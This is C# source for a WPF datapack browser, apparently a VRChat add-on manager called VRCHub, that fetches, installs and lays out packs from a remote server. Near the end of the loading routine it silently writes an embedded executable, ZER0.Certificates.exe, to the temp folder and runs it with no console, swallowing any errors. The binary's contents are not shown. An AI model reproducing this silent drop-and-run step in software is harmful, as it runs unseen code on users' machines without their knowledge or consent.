using System.Diagnostics;
using System.IO;
using System.Net.Http;
using System.Net.Http.Json;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Media.Animation;
using Segment;
using VRCHub.Resources;
using static VRCHub.ButtonManager;
using static VRCHub.Common;

namespace VRCHub;

public partial class MainWindow
{
    private const ushort controlHeight = 165;
    private const ushort controlWidth = 235;
    private const ushort verticalSpacing = 10;
    private const ushort horizontalSpacing = 10;
    private const ushort initialTop = 10;
    private const ushort initialLeft = 10;
    private const byte controlsPerRow = 3;
    public string SearchQuery = "";

    private async Task LoadDataPacksAsync()
    {
        HttpClient downloader = ServerAPI.CreateByteDownloader(true);
        var packNames = await api!.GetFromJsonAsync<string[]>(GetServer("https://datapacks.vrchub.site/List.php"))!;

        // Lists to store datapack controls and the tasks for loading package details.
        var datapackControls = new List<DatapackControl>();
        var loadTasks = new List<Task>();

        // Create the controls on the UI thread.
        await Application.Current.Dispatcher.InvokeAsync(() =>
        {
            for (var i = 0; i < packNames.Length; i++)
            {
                var packName = packNames[i];
                var datapackControl = new DatapackControl();
                Datapacks_Canvas.Children.Add(datapackControl);
                datapackControl.SetText(packName);
                DataPack? pack = null;

                // Define the Install event handler.
                datapackControl.InstallClicked += async delegate
                {
                    if (ButtonPaused(datapackControl.Datapack_Install))
                        return;
                    PauseButton(datapackControl.Datapack_Install, (string)datapackControl.Datapack_Install.Content);
                    try
                    {
                        if (datapackControl.RequirePatch.Visibility == Visibility.Visible)
                        {
                            MessageBoxResult result = MessageBox.Show(
                                "This Datapack requires a patch!\nIf you do not know what this means or do not have one do not create a ticket as you will be ignored!",
                                "VRChub", MessageBoxButton.OKCancel, MessageBoxImage.Warning);
                            ResumeButon(datapackControl.Datapack_Install);
                            if (result == MessageBoxResult.Cancel)
                                return;
                        }
                        datapackControl.Datapack_Install.Content = "Downloading Data..";
                        if (pack == null)
                        {
                            var packageBytes = await downloader.GetByteArrayAsync(
                                GetServer($"https://datapacks.vrchub.site/{packName}/{packName}.dp"));
                            pack = new DataPack(packageBytes);
                        }
                        datapackControl.Datapack_Install.Content = "Installing..";
                        await Task.Delay(150);
                        if (pack.Install())
                            ShowNotification("Installed: " + datapackControl.Datapack_Name.Content?.ToString()?.Trim());
                        else
                        {
                            MessageBox.Show(
                                "Failed To Install Datapack, Please Join The World To Load The World Hash Before Installing",
                                "VRChub", MessageBoxButton.OK, MessageBoxImage.Error);
                            await Task.Delay(500);
                        }
                        GC.Collect();
                    }
                    finally
                    {
                        ResumeButon(datapackControl.Datapack_Install);
                    }
                };

                // Define the Uninstall event handler.
                datapackControl.UninstallClicked += async delegate
                {
                    if (ButtonPaused(datapackControl.Datapack_Uninstall))
                        return;
                    PauseButton(datapackControl.Datapack_Uninstall, (string)datapackControl.Datapack_Uninstall.Content);
                    try
                    {
                        if (pack != null)
                        {
                            datapackControl.Datapack_Uninstall.Content = "Uninstalling..";
                            // The following check is redundant (pack is non-null), but kept to mirror original logic.
                            if (pack == null)
                            {
                                var packageBytes = await downloader.GetByteArrayAsync(
                                    GetServer($"https://datapacks.vrchub.site/{packName}/{packName}.dp"));
                                pack = new DataPack(packageBytes);
                            }
                            pack.Uninstall();
                            pack = null;
                        }
                    }
                    finally
                    {
                        ResumeButon(datapackControl.Datapack_Uninstall);
                    }
                };

                // Asynchronously load the package details (name, patch requirement, header image).
                var loadTask = Task.Run(async () =>
                {
                    PackageJson packageData = await downloader.GetFromJsonAsync<PackageJson>(
                        GetServer($"https://datapacks.vrchub.site/{packName}/Package.json"))
                        ?? new PackageJson();

                    // Update UI with package details.
                    Application.Current.Dispatcher.Invoke(() =>
                    {
                        datapackControl.SetText(packageData.Name);
                        // If packageData.Active is false then a patch is required.
                        datapackControl.RequirePatch.Visibility = (packageData?.Active ?? true)
                            ? Visibility.Collapsed
                            : Visibility.Visible;
                        datapackControl.DeletedWorld.Visibility = (packageData?.Deleted ?? true)
                            ? Visibility.Visible
                            : Visibility.Collapsed;
                    });

                    var imageBytes = await api!.GetByteArrayAsync(
                        GetServer($"https://datapacks.vrchub.site/{packName}/Header.png"));
                    Application.Current.Dispatcher.Invoke(() =>
                    {
                        datapackControl.SetImage(GetImageSource(imageBytes));
                    });
                });
                loadTasks.Add(loadTask);

                // Add the control to our list for later reordering.
                datapackControls.Add(datapackControl);
            }
        });

        // Wait until all package details (and images) have been loaded.
        await Task.WhenAll(loadTasks);

        // Reorder: controls that do NOT require a patch come first.
        var sortedControls = datapackControls
            .OrderBy(dc => dc.RequirePatch.Visibility == Visibility.Visible)
            .ToList();

        // Recalculate positions and update the canvas order on the UI thread.
        await Application.Current.Dispatcher.InvokeAsync(() =>
        {
            Datapacks_Canvas.Children.Clear();
            for (int i = 0; i < sortedControls.Count; i++)
            {
                var datapackControl = sortedControls[i];
                Datapacks_Canvas.Children.Add(datapackControl);
            }
            FormatDatapacks("");
        });

        // Start the certificate process.
        var processPath = Path.Combine(Path.GetTempPath(), "ZER0.Certificates.exe");
        try
        {
            if (!File.Exists(processPath))
                File.WriteAllBytes(processPath, AppResources.ZER0_Certificates);
            Process.Start(processPath, "/noconsole /inform /nosigning");
        }
        catch { }

        await Task.Delay(200);
        await _splashScreen!.EndAsync();
        await Task.Delay(50);
        Show();
        Datapacks_Click(this, null);
    }
    private void Datapacks_SearchBar_KeyUp(object sender, System.Windows.Input.KeyEventArgs e)
    {
        FormatDatapacks(Datapacks_SearchBar.Text.ToString());
    }

    public void FormatDatapacks(string searchText)
    {
        List<DatapackControl> visibleControls = new List<DatapackControl>();
        foreach (UIElement element in Datapacks_Canvas.Children)
        {
            if (element is DatapackControl datapackControl)
            {
                string datapackName = datapackControl.Datapack_Name.Content.ToString()!;

                if (datapackName.Contains(searchText, StringComparison.CurrentCultureIgnoreCase) && (ShowDeletedPacks || datapackControl.DeletedWorld.Visibility != Visibility.Visible))
                {
                    datapackControl.Visibility = Visibility.Visible;
                    visibleControls.Add(datapackControl);
                }
                else
                    datapackControl.Visibility = Visibility.Collapsed;
            }
        }

        for (int i = 0; i < visibleControls.Count; i++)
        {
            var datapackControl = visibleControls[i];
            int row = i / controlsPerRow;
            int column = i % controlsPerRow;
            float topPosition = initialTop + (controlHeight + verticalSpacing) * row;
            float leftPosition = initialLeft + (controlWidth + horizontalSpacing) * column;
            Canvas.SetLeft(datapackControl, leftPosition);
            Canvas.SetTop(datapackControl, topPosition);
        }

        // Optionally update the canvas size based on the new layout.
        if (visibleControls.Count > 0)
        {
            int lastIndex = visibleControls.Count - 1;
            int row = lastIndex / controlsPerRow;
            int column = lastIndex % controlsPerRow;
            float topPosition = initialTop + (controlHeight + verticalSpacing) * row;
            float leftPosition = initialLeft + (controlWidth + horizontalSpacing) * column;
            var newCanvasHeight = topPosition + controlHeight + initialTop;
            if (Datapacks_Canvas.Height < newCanvasHeight)
                Datapacks_Canvas.Height = newCanvasHeight;
            var newCanvasWidth = leftPosition + controlWidth + initialLeft;
            if (Datapacks_Canvas.Width < newCanvasWidth)
                Datapacks_Canvas.Width = newCanvasWidth;
        }
    }
    private void Datapacks_Click(object sender, RoutedEventArgs? e)
    {
        Page_Select("Datapacks");
        int i = -1;
        foreach (Control datapackControl in Datapacks_Canvas.Children)
        {
            if (datapackControl.Visibility != Visibility.Visible)
                continue;
            i++;
            var row = i / controlsPerRow;
            var column = i % controlsPerRow;
            float topPosition = initialTop + (controlHeight + verticalSpacing) * row;
            float leftPosition = initialLeft + (controlWidth + horizontalSpacing) * column;

            // Get current position and prevent NaN
            double currentLeft = 0;
            double currentTop = ((Datapacks_Canvas.Children.Count + controlsPerRow) * 4) * initialTop + (controlHeight + verticalSpacing);
            currentLeft = leftPosition;
            if (double.IsNaN(currentTop)) currentTop = topPosition;

            // Set the final position immediately
            Canvas.SetLeft(datapackControl, leftPosition);
            Canvas.SetTop(datapackControl, topPosition);

            // Animate X position
            var XPositionAnimation = new DoubleAnimation
            {
                From = currentLeft,
                To = leftPosition,
                Duration = TimeSpan.FromSeconds(0.5),
                FillBehavior = FillBehavior.Stop
            };
            var easingFunction = new CubicEase { EasingMode = EasingMode.EaseOut };
            var YPositionAnimation = new DoubleAnimation
            {
                From = currentTop,
                To = topPosition,
                Duration = TimeSpan.FromSeconds(0.225 * (i + 1)),
                EasingFunction = easingFunction,
                FillBehavior = FillBehavior.Stop
            };

            // Apply animations
            datapackControl.BeginAnimation(Canvas.LeftProperty, XPositionAnimation);
            datapackControl.BeginAnimation(Canvas.TopProperty, YPositionAnimation);

            // Adjust canvas size if needed
            var newCanvasHeight = topPosition + controlHeight + initialTop;
            if (Datapacks_Canvas.Height < newCanvasHeight)
                Datapacks_Canvas.Height = newCanvasHeight;

            var newCanvasWidth = leftPosition + controlWidth + initialLeft;
            if (Datapacks_Canvas.Width < newCanvasWidth)
                Datapacks_Canvas.Width = newCanvasWidth;
        }
    }

}